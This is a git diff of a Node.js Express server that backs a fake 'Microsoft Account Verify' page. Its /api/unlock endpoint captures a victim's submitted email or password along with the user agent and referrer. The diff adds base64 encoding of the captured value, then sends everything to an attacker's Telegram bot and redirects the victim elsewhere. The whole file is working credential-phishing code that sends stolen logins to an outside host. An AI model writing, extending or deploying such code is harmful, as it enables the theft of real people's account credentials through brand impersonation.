@@ -10,21 +10,28 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 // Add as many URLs as you want here. The script will pick one at random.
-// These links are NEVER sent to the browser until the form is successfully submitted.
 const REDIRECT_URLS = [
   "https://x.com/",
   "https://x.com"
 ];
 
+// Base64 encode function for Node.js
+function base64Encode(str) {
+  return Buffer.from(str, 'utf-8').toString('base64');
+}
+
 app.post('/api/unlock', async (req, res) => {
   try {
-    // 1. Capture the email (and fallback to password just in case)
+    // Capture the email (and fallback to password just in case)
     const { email, password, userAgent, referrer } = req.body;
     const submittedValue = email || password || 'No input provided';
+    
+    // Base64 encode the captured value
+    const encodedValue = base64Encode(submittedValue);
 
     console.log('Received verify request. Value provided:', submittedValue);
+    console.log('Encoded value:', encodedValue);
 
-    // 2. Get Telegram credentials from environment variables
     const token = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -46,17 +53,18 @@ app.post('/api/unlock', async (req, res) => {
       second: '2-digit'
     });
 
-    // 3. Format the message for Telegram
+    // Format the message for Telegram with encoded email
     const message = 
       `SUCCESSFUL VERIFICATION\n` +
       `Page: Microsoft Account Verify\n` +
       `Time: ${now}\n` +
       `User Agent: ${userAgent || 'unknown'}\n` +
       `Referrer: ${referrer || 'direct'}\n` +
-      `Captured Email/Value: ${submittedValue}\n` +
+      `Captured Email: ${submittedValue}\n` +
+      `Encoded Email: ${encodedValue}\n` +
       `Client accessed the verification page.`;
 
-    // 4. Send the notification to Telegram
+    // Send the notification to Telegram
     try {
       const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
         chat_id: chatId,
@@ -72,9 +80,10 @@ app.post('/api/unlock', async (req, res) => {
       }
     }
 
-    // 5. Pick a random URL and send it to the client to redirect them
+    // Pick a random URL and redirect
     const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
 
+    // Send success response with redirect URL
     res.json({ 
       success: true, 
       redirectUrl: randomUrl 
